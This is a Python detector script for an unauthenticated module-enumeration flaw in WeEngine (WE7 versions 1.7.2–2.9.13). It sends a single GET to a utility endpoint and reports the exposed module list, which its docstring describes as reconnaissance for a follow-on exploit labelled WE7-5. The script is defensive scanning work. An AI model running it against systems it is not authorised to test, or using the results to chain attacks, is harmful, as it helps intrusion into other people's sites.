#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WE7-4 — Unauthenticated enumeration of installed modules
========================================================
Type      : CWE-200 Exposure of Sensitive Information (informational)
Component : web/source/utility/modules.ctrl.php  (do=list)
Affected  : 1.7.2 – 2.9.13 (still present in the current release)
Severity  : Low / informational — no direct impact, but it fingerprints the
            site for WE7-5 (it tells an attacker which modules exist, and the
            module name is the only parameter WE7-5 needs).

Why it works
------------
`modules` is part of the unauthenticated `direct` ACL of `utility`, and the
controller returns the module table as JSON without checking a session.
The reply contains module identifiers, titles, `issystem` and `enabled` flags.

What this detector does (NON-DESTRUCTIVE)
-----------------------------------------
One GET, reads the JSON envelope, reports whether module data came back.
No enumeration of accounts, no iteration.

Exit codes: 0 = not exposed · 1 = exposed · 2 = inconclusive

Usage:
    python3 we7_4_module_enum.py -u http://127.0.0.1:8084
    python3 we7_4_module_enum.py -u https://target --json
"""

import argparse
import json
import sys
import urllib.error
import urllib.request

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0 Safari/537.36")


def http_get(url, timeout=15):
    req = urllib.request.Request(url, headers={"User-Agent": UA, "Accept": "*/*"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(300000)
    except urllib.error.HTTPError as e:
        return e.code, (e.read(300000) if e.fp else b"")
    except Exception as e:
        return None, str(e).encode()


def check(base, timeout=15):
    url = f"{base.rstrip('/')}/web/index.php?c=utility&a=modules&do=list"
    status, body = http_get(url, timeout)
    text = body.decode("utf-8", "replace")
    items = []
    structured = False
    try:
        data = json.loads(text)
        # WeEngine wraps its ajax replies twice: message -> message -> items
        inner = (data.get("message") or {})
        inner2 = (inner.get("message") or {}) if isinstance(inner, dict) else {}
        items_dict = inner2.get("items") if isinstance(inner2, dict) else None
        if isinstance(items_dict, dict):
            items = list(items_dict)
            structured = True
    except Exception:
        pass
    # require the real envelope structure, not just the word "items" in a page
    exposed = status == 200 and structured
    return {"target": base, "check": "WE7-4 unauthenticated module enumeration", "url": url,
            "status": status, "bytes": len(body), "modules": items,
            "verdict": ("EXPOSED (installed module list returned without a session)" if exposed
                        else "not exposed")}


def main():
    ap = argparse.ArgumentParser(description="WE7-4 detector")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--json", action="store_true")
    a = ap.parse_args()
    base = a.url if "://" in a.url else "http://" + a.url
    r = check(base, a.timeout)
    if a.json:
        print(json.dumps(r, ensure_ascii=False, indent=2))
    else:
        print(f"[WE7-4] {r['target']}")
        print(f"  type    : CWE-200 information exposure (informational)")
        print(f"  affected: 1.7.2 - 2.9.13 (not fixed)")
        print(f"  request : GET {r['url']}")
        print(f"  response: HTTP {r['status']} / {r['bytes']} bytes")
        print(f"  modules : {', '.join(r['modules']) if r['modules'] else '(none parsed)'}")
        print(f"  verdict : {r['verdict']}")
    return 1 if r["verdict"].startswith("EXPOSED") else 0


if __name__ == "__main__":
    sys.exit(main())
